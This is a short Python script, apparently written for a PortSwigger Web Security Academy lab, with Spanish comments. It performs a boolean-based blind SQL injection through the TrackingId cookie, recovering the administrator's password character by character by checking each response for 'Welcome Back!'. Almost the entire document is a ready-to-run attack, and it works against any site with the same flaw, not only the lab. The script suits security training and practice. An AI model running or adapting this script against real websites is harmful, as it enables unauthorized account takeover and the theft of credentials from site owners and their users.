#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal, re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url='https://0aa10027033f362e816aa27f00350020.web-security-academy.net/'

def makeRequest():
  p1 = log.progress("Blind SQLI")
  p1.status("Iniciando ataque de fuerza bruta basado basado en condiciones booleanas")

  p2 = log.progress("Data")
  p3 = log.progress("Character")
  time.sleep(2)

  final_data = ""

  x = requests.get(main_url)
  cookie = x.cookies
  trackingid = cookie.get('TrackingId')
  session = cookie.get('session')
  characters = string.ascii_lowercase + string.digits

  for position in range(1,25):
    for character in characters:
      sqli="' and (select substring(password,%d,1) from users where username = 'administrator')='%c" % (position, character)
      cookies = {'TrackingId': trackingid + sqli, 'session': session}
      p3.status(character)
      r = requests.get(main_url, cookies=cookies)
      patron = "Welcome Back!"
      body_response = str(r.content)
      match = re.search(patron, body_response, re.IGNORECASE)
      if match:
        final_data += character
        p2.status(final_data)
        break
if __name__ == '__main__':
  makeRequest()
